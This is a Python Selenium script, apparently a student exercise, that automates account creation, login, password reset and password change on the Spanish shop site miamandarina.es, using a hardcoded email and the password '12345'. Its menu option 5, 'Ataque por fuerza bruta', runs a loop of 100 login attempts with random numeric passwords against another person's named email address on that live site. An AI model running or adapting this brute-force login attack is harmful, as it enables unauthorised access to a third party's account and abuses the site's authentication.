from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys 
from selenium.webdriver import ActionChains


import time 

def creacion(): 
	browser = Chrome()
	browser.get('https://www.miamandarina.es')
	browser.find_element_by_xpath("//a[@rel='nofollow']").click()
	time.sleep(2)
	browser.find_element_by_id('SubmitCreate').click()
	time.sleep(2)
	button = browser.find_element_by_id('customer_firstname')
	button.send_keys('flor')
	button = browser.find_element_by_id('customer_lastname')
	button.send_keys('c')
	button = browser.find_element_by_xpath("//input[@name='email' and @class = 'text']" )	
	button.send_keys('fmallete@gmail.com')
	button = browser.find_element_by_xpath("//input[@name='passwd' and @class = 'text']" )	
	button.send_keys('12345')
	browser.find_element_by_id('pprivacidad').click()
	browser.find_element_by_id('submitAccount').click()
def ingresar():
	browser = Chrome()
	browser.get('https://www.miamandarina.es')
	browser.find_element_by_xpath("//a[@rel='nofollow']").click()
	time.sleep(2)
	button = browser.find_element_by_xpath("//input[@name='email' and @class = 'account_input']" )	
	button.send_keys('fmallete@gmail.com')
	button = browser.find_element_by_xpath("//input[@name='passwd' and @class = 'account_input']" )	
	button.send_keys('12345')
	browser.find_element_by_id('SubmitLogin').click()

def reestablecer():
	browser = Chrome()
	browser.get('https://www.miamandarina.es')
	browser.find_element_by_xpath("//a[@rel='nofollow']").click()
	time.sleep(2)
	button = browser.find_element_by_link_text('¿Has olvidado tu contraseña?')	
	button.click()
	time.sleep(2)
	button = browser.find_element_by_id('email' )	
	button.send_keys('fmallete@gmail.com')
	browser.find_element_by_xpath("//input[@value='Recuperar']").click()
def cambiar(): 
	browser = Chrome()
	browser.get('https://www.miamandarina.es')
	browser.find_element_by_xpath("//a[@rel='nofollow']").click()
	time.sleep(2)
	button = browser.find_element_by_xpath("//input[@name='email' and @class = 'account_input']" )	
	button.send_keys('fmallete@gmail.com')
	button = browser.find_element_by_xpath("//input[@name='passwd' and @class = 'account_input']" )	
	button.send_keys('12345')
	browser.find_element_by_id('SubmitLogin').click()
	time.sleep(2)
	button = browser.find_element_by_link_text('Información' )	
	button.click()
	button = browser.find_element_by_id('old_passwd')
	button.send_keys('12345')
	button = browser.find_element_by_id('passwd')
	button.send_keys('123456')
	button = browser.find_element_by_id('confirmation')
	button.send_keys('123456')
	browser.find_element_by_name('submitIdentity').click()

def ataque():
	browser = Chrome()
	browser.get('https://www.miamandarina.es/autenticacion')
	for x in range(100):
		button = browser.find_element_by_xpath("//input[@name='email' and @class = 'account_input']" )
		button.clear()	
		button.send_keys('gina.lazo@live.com')
		button = browser.find_element_by_xpath("//input[@name='passwd' and @class = 'account_input']" )	
		dato = random.randint(10000,100000) 
		button.clear()
		button.send_keys(dato)
		print("intento : ",  x )
		browser.find_element_by_id('SubmitLogin').click()
		time.sleep(2)

c = True
while c : 
	print('Creacion de cuenta (1)')
	print('Ingresar a cuenta  (2)')
	print('Reestablecer cuenta (3)')
	print('cambiar contraseña (4)')
	print('Ataque por fuerza bruta (5)')
	opcion = input()

	if opcion == '1':
		creacion()
	elif opcion == '2': 
		ingresar()
	elif opcion == '3': 
		reestablecer()
	elif opcion =='4':
		cambiar()
	else : 
		ataque()